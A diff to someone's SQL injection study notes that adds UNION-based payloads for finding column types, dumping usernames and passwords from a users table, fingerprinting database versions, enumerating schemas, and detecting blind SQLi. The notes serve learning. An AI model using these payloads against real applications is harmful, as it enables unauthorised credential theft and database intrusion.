@@ -12,7 +12,7 @@ eg.   ---> administator'--
 
 
 3.Retrieving data from other database tables
-++++++++++++++++++++++++++++++++++use of union sttacks+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++use of union attacks+++++++++++++++++++++++++++++++++++++++++++++++
 ' UNION SELECT username, password FROM users--      -----> for union attacks no of attributes must match and so the data types
 
 
@@ -28,6 +28,59 @@ use of order by clause to find the number of columns
 etc.
 
 ' UNION SELECT NULL FROM DUAL--  -------> for oracle SQL
+
+
+
+4. finding column with useful datatype
+we can use this method recursively
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+to find whcih column matches required datatype
+
+
+
+5. Union injection to retreive interesting data
+suppose we have determined the datatypes of cl=olumns then we can use union techniques to gather data
+' UNION SELECT username, password FROM users--      ------> if more than two columns we can either use null aur any charter or interger in place of column name
+
+
+
+6. retrieving multiple values from database
+' UNION SELECT username || '~' || password FROM users--    -------> different databases have different contaenation oerators -----> here || is concatenation operator
+
+
+
+
+###################################EXAMINATION OF DATABASE BEING USED##################################################################
+7.Database          type 	Query
+Microsoft,mysql     SELECT @@version
+Oracle 	            SELECT * FROM v$version
+PostgreSQL 	        SELECT version() 
+
+following methods can be used with union attacks to find database version and type 
+eg .   ' UNION SELECT @@version--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--      ------> for oracle
+'+UNION+SELECT+@@version,+NULL#  --------> for mysql and microsoft ---> see hashtag "#" for commenting or ending
+
+
+
+8. listing the contents of database
+for non oracle ------>   SELECT * FROM information_schema.tables
+                         SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+
+for oracle only  --------->   SELECT * FROM all_tables
+                              SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+
+
++++++++++++++++++++++++++++++++++++++++++++BLIND SQLI++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+how to cause detectable diferences to find blind sqli
+1.cause a divide by zero
+2. cause a delay
+3.using burp collaborator
+
 
 
 
